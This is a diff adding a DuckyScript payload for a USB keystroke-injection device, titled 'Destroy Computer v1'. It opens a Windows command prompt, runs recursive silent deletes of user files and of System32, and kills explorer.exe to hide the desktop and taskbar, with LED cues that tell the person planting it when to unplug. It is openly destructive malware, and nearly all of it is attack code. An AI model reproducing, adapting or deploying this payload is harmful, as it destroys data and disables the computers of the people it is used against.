@@ -1,0 +1,36 @@
+REM Destroy Computer v1 (Loud)
+REM Works only on Windows 10
+REM By: The_Typhoon1
+REM -------------------------------------------------------------------------
+REM Steps: 
+REM 1. Open CMD
+REM 2. Delete all files
+REM 3. Delete System 32
+REM 4. Minimises every window except the current one
+REM 5. Taskkill background and taskbar (essentially hiding them)
+REM 6. Minimise CMD window to the now hidden taskbar
+REM -------------------------------------------------------------------------
+REM Important:
+REM When LED is red it is running code
+REM When LED is Green you can unplug it as it has finished running code.
+REM -------------------------------------------------------------------------
+ATTACKMODE HID
+LED_R
+DELAY 2000
+GUI r
+DELAY 500
+STRINGLN cmd
+DELAY 1500
+STRINGLN del /s /q “.”
+DELAY 100
+STRINGLN del system32 /s /f
+DELAY 100
+GUI HOME 
+DELAY 100
+STRINGLN taskkill /f /im “explorer.exe”
+DELAY 100
+GUI DOWN
+DELAY 100
+GUI DOWN
+DELAY 100
+LED_G
